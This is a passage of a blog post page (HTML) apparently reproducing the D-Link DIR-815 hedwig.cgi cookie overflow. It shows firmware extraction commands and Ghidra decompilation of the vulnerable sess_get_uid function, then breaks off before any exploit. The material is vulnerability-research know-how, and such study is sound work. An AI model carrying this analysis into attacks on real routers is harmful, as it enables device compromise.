@@ -1,0 +1,2240 @@
+<!DOCTYPE HTML>
+<html lang="en">
+    <!-- shw2018 洪卫  modify 2019.08.15-->
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="路由器学习之D-Link DIR-815溢出漏洞复现, xiaoxin">
+    <meta name="baidu-site-verification" content="fmlEuI34ir">
+    <meta name="google-site-verification" content="KeoTn_OFy4ndJwXNmm2gMeQfPhd7alqE9vQDwI32KCY">
+    <meta name="description" content="[toc]
+前言用了mipsrop发现是真的香，以前做mips题全部是ropper到txt里找相关寄存器的指令，构造极其复杂，有了mipsrop发现很多可控的jmp地址。
+基本信息
+
+我们看到是在hedwig.cgi中产生的一个cookie">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google-site-verification" content="QLot9tUq5T-osxvFuAqTi1k4ZPWrio9O9znX-Z2Q3Ic">
+    <title>路由器学习之D-Link DIR-815溢出漏洞复现 | xiaoxin</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/materialize/1.0.0/css/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/aos/3.0.0-beta.6/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/lightgallery/1.6.12/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    
+    <style type="text/css">
+        
+            
+            code[class*="language-"],
+            pre[class*="language-"] {
+                white-space: pre !important;
+            }
+
+        
+    </style>
+
+    <script src="https://libs.baidu.com/jquery/2.1.4/jquery.min.js"></script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    
+    <script>
+        var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?46e79e71af0709a5b9106bf20cecc493";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+    
+    
+        <script>
+            (function(){
+                var bp = document.createElement('script');
+                var curProtocol = window.location.protocol.split(':')[0];
+                if (curProtocol === 'https') {
+                    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+                }
+                else {
+                    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                }
+                var s = document.getElementsByTagName("script")[0];
+                s.parentNode.insertBefore(bp, s);
+            })();
+        </script>
+    
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+    <body>
+
+        <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">xiaoxin</span>
+                </a>
+            </div>
+            
+
+
+<!-- <a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>Index</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>Tags</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>Categories</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>Archives</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/AV" class="waves-effect waves-light">
+            
+            <i class="fa fa-music"></i>
+            
+            <span>AV</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/galleries" class="waves-effect waves-light">
+            
+            <i class="fa fa-photo"></i>
+            
+            <span>Galleries</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>About</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/contact" class="waves-effect waves-light">
+            
+            <i class="fa fa-envelope"></i>
+            
+            <span>Contact</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>Friends</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="Search"></i>
+        </a>
+    </li>
+</ul> -->
+
+<!-- 支持二级菜单特性 小羊 Shinnosuke modify 2019.09.17  -->
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right nav-menu">
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/" class="waves-effect waves-light">
+              
+                <i class="fa fa-home"></i>
+              
+              <span>Index</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/tags" class="waves-effect waves-light">
+              
+                <i class="fa fa-tags"></i>
+              
+              <span>Tags</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/categories" class="waves-effect waves-light">
+              
+                <i class="fa fa-bookmark"></i>
+              
+              <span>Categories</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/archives" class="waves-effect waves-light">
+              
+                <i class="fa fa-archive"></i>
+              
+              <span>Archives</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/AV" class="waves-effect waves-light">
+              
+                <i class="fa fa-music"></i>
+              
+              <span>AV</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/galleries" class="waves-effect waves-light">
+              
+                <i class="fa fa-photo"></i>
+              
+              <span>Galleries</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/about" class="waves-effect waves-light">
+              
+                <i class="fa fa-user-circle-o"></i>
+              
+              <span>About</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/contact" class="waves-effect waves-light">
+              
+                <i class="fa fa-envelope"></i>
+              
+              <span>Contact</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/friends" class="waves-effect waves-light">
+              
+                <i class="fa fa-address-book"></i>
+              
+              <span>Friends</span>
+            </a>
+
+            
+      </li>
+    
+
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="Search"></i>
+        </a>
+    </li>
+
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">xiaoxin</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                Index
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                Tags
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                Categories
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                Archives
+            </a>
+        </li>
+        
+        <li>
+            <a href="/AV" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-music"></i>
+                
+                AV
+            </a>
+        </li>
+        
+        <li>
+            <a href="/galleries" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-photo"></i>
+                
+                Galleries
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                About
+            </a>
+        </li>
+        
+        <li>
+            <a href="/contact" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-envelope"></i>
+                
+                Contact
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                Friends
+            </a>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/BlueSheepYang/bluesheepyang.github.io" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+
+   
+   
+<!-- 支持二级菜单特性 小羊 Shinnosuke shw2018 modify 2019.09.17  -->
+<!-- <ul class="menu-list mobile-menu-list">
+    
+        <li class="m-nav-item">
+                
+                    <a href="/" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-home"></i>
+                        
+                        Index
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/tags" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-tags"></i>
+                        
+                        Tags
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/categories" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-bookmark"></i>
+                        
+                        Categories
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/archives" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-archive"></i>
+                        
+                        Archives
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/AV" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-music"></i>
+                        
+                        AV
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/galleries" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-photo"></i>
+                        
+                        Galleries
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/about" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-user-circle-o"></i>
+                        
+                        About
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/contact" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-envelope"></i>
+                        
+                        Contact
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/friends" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-address-book"></i>
+                        
+                        Friends
+                    </a>
+              
+            </li>
+        
+
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/BlueSheepYang/bluesheepyang.github.io" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul> -->
+
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/BlueSheepYang/bluesheepyang.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+        
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        路由器学习之D-Link DIR-815溢出漏洞复现
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- shw2018 洪卫  modify 2019.08.15-->
+<!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/路由器漏洞复现/" target="_blank">
+                                <span class="chip bg-color">路由器漏洞复现</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/从0学习路由器/" class="post-category" target="_blank">
+                                从0学习路由器
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2020-12-09
+                </div>
+
+                <div class="post-author info-break-policy">
+                    <i class="fa fa-user-o fa-fw"></i>Author:&nbsp;&nbsp;
+                    
+                        Shinnosuke
+                    
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
+                        2.9k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
+                        14 Min
+                    </div>
+                    
+                
+                
+                
+                        <span id="busuanzi_container_site_pv" style='display:none'></span>
+                        <i class="fa fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv" ></span>
+    
+                
+
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>[toc]</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>用了mipsrop发现是真的香，以前做mips题全部是ropper到txt里找相关寄存器的指令，构造极其复杂，有了mipsrop发现很多可控的jmp地址。</p>
+<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/0.png"></div>
+
+<p>我们看到是在hedwig.cgi中产生的一个cookie溢出的漏洞。我们下载这个固件利用binwalk -e [file]即可获得文件系统，利用命令：</p>
+<pre class="line-numbers language-bash"><code class="language-bash"> <span class="token function">find</span> ./ -name <span class="token string">'hedwig.cgi'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>找到其对应的位置，在该文件位置处利用命令：</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ls</span> -l hedwig.cgi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>查看该文件信息</p>
+<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/1.png"></div>
+我们看到这个文件是指向cgibin的符号链接，这个好像没什么用
+
+<h1 id="Ghidra反汇编程序分析"><a href="#Ghidra反汇编程序分析" class="headerlink" title="Ghidra反汇编程序分析"></a>Ghidra反汇编程序分析</h1><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/2.png"></div>
+
+<p>程序通过getenv函数获取数据包中cookie数据：</p>
+<p><strong>流程大概是：<br>1主Web程序监听端口-&gt;传送HTTP数据包<br>2.HTTP中headers等数据通过环境变量的方式传给cgi处理程序<br>3.cgi程序通过getenv获取数据并处理返回给主程序-&gt;向客户端返回响应数据<br>4.POST具体数据可以通过类似输入流传入 ：echo “uid=aaa”| /htdocs/web/hedwig.cgi</strong></p>
+<p>定位到sess_get_uid函数</p>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sess_get_uid</span><span class="token punctuation">(</span>undefined4 param_1<span class="token punctuation">)</span>
+
+<span class="token punctuation">{</span>
+  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>pcVar2<span class="token punctuation">;</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>pcVar3_cookie<span class="token punctuation">;</span>
+  undefined4 uVar3<span class="token punctuation">;</span>
+  <span class="token keyword">int</span> iVar4<span class="token punctuation">;</span>
+  uint uVar5<span class="token punctuation">;</span>
+  code <span class="token operator">*</span>pcVar6<span class="token punctuation">;</span>
+
+                    <span class="token comment" spellcheck="true">/* malloc 0x18 heap */</span>
+  iVar1 <span class="token operator">=</span> <span class="token function">sobj_new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  pcVar2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sobj_new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  pcVar3_cookie <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"HTTP_COOKIE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>iVar1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>pcVar2 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>pcVar3_cookie <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    uVar5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+LAB_00407e28<span class="token punctuation">:</span>
+    iVar4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>pcVar3_cookie<span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar4 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> LAB_00407ec4<span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>uVar5 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+LAB_00407db0<span class="token punctuation">:</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar4 <span class="token operator">==</span> <span class="token number">0x3b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        uVar5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+      <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        uVar5 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar4 <span class="token operator">!=</span> <span class="token number">0x3d</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+          <span class="token function">sobj_add_char</span><span class="token punctuation">(</span>iVar1<span class="token punctuation">,</span>iVar4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+          uVar5 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+      <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">else</span> <span class="token punctuation">{</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>uVar5 <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>uVar5 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar4 <span class="token operator">!=</span> <span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token function">sobj_free</span><span class="token punctuation">(</span>iVar1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">sobj_free</span><span class="token punctuation">(</span>pcVar2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">goto</span> LAB_00407db0<span class="token punctuation">;</span>
+          <span class="token punctuation">}</span>
+          <span class="token keyword">goto</span> LAB_00407e24<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        pcVar3_cookie <span class="token operator">=</span> pcVar3_cookie <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
+        <span class="token keyword">goto</span> LAB_00407e28<span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>uVar5 <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar4 <span class="token operator">==</span> <span class="token number">0x3b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+          uVar5 <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
+          <span class="token keyword">goto</span> LAB_00407e24<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token function">sobj_add_char</span><span class="token punctuation">(</span>pcVar2<span class="token punctuation">,</span>iVar4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        pcVar3_cookie <span class="token operator">=</span> pcVar3_cookie <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
+        <span class="token keyword">goto</span> LAB_00407e28<span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>uVar5 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        iVar4 <span class="token operator">=</span> <span class="token function">sobj_strcmp</span><span class="token punctuation">(</span>iVar1<span class="token punctuation">,</span><span class="token operator">&amp;</span>DAT_0041a5d8<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        uVar5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar4 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> LAB_00407e24<span class="token punctuation">;</span>
+        <span class="token keyword">goto</span> LAB_00407e40<span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+LAB_00407e24<span class="token punctuation">:</span>
+    pcVar3_cookie <span class="token operator">=</span> pcVar3_cookie <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token keyword">goto</span> LAB_00407e28<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+LAB_00407ee0<span class="token punctuation">:</span>
+  pcVar6 <span class="token operator">=</span> getenv<span class="token punctuation">;</span>
+  pcVar3_cookie <span class="token operator">=</span> <span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">;</span>
+LAB_00407e48<span class="token punctuation">:</span>
+  uVar3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>pcVar6<span class="token punctuation">)</span><span class="token punctuation">(</span>pcVar3_cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">sobj_add_string</span><span class="token punctuation">(</span>param_1<span class="token punctuation">,</span>uVar3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">sobj_del</span><span class="token punctuation">(</span>iVar1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>pcVar2 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token comment" spellcheck="true">/* WARNING: Could not recover jumptable at 0x00407ebc. Too many branches */</span>
+                    <span class="token comment" spellcheck="true">/* WARNING: Treating indirect jump as call */</span>
+    <span class="token function">sobj_del</span><span class="token punctuation">(</span>pcVar2<span class="token punctuation">)</span><span class="token punctuation">;</span>
